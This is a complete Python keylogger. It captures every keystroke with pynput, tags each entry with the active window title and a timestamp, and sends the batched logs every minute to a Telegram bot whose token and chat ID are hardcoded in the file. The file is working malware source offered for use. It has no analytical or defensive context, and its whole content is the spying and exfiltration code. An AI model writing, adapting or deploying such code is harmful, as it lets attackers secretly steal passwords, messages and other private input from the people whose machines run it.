#!/usr/bin/env python3

import os
import time
import requests
from pynput import keyboard
from datetime import datetime

# === CONFIGURATION ===
BOT_TOKEN = "7414600368:AAFrI8_6mCllDlyYAUya3Xc3vkScLF2eR6U"
CHAT_ID = "5961669242"
LOG_INTERVAL = 60  # seconds between sending logs

log_buffer = []

def get_active_window():
    try:
        return os.popen("xdotool getactivewindow getwindowname").read().strip()
    except:
        return "Unknown"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram error: {e}")

def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') and key.char else str(key)
    except:
        key_str = str(key)
    window = get_active_window()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {window} → {key_str}"
    log_buffer.append(log_entry)

def flush_logs():
    if log_buffer:
        message = "\n".join(log_buffer)
        send_to_telegram(f"🧠 Keylog Report:\n{message}")
        log_buffer.clear()

def start_keylogger():
    print("🔐 Keylogger started (Ctrl+C to stop)...")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while True:
            time.sleep(LOG_INTERVAL)
            flush_logs()
    except KeyboardInterrupt:
        flush_logs()
        print("🛑 Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()
